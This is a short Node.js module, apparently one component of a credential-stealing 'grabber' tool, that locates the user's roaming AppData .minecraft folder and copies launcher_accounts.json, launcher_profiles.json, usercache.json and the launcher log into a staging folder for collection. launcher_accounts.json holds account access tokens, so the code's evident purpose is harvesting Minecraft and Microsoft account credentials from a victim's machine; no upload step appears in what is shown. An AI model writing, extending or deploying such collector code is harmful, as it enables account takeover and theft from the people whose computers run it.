const { paths: { roamingAppData } } = require('../variables');
const { join } = require('path');
const fs = require('fs');

module.exports = (folder) => {
  const path = join(roamingAppData, '.minecraft');
  fs.mkdirSync(join(folder, 'Minecraft'));
  const files = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt'];

  files.forEach(file => {
    if (fs.existsSync(join(path, file))) {
      fs.copyFileSync(join(path, file), join(folder, 'Minecraft', file));
    }
  });
};
